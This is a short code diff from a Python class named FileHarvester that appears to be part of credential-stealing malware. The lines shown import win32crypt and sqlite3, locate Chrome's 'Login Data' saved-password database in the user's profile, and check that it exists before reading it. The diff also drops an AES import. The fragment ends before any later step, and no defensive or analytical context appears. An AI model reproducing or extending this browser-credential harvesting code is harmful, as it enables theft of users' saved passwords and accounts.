@@ -83,7 +83,6 @@ class FileHarvester:
         try:
             import sqlite3
             import shutil
-            from Crypto.Cipher import AES
             import win32crypt
             chrome_path = os.path.expanduser('~') + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
             if os.path.exists(chrome_path):
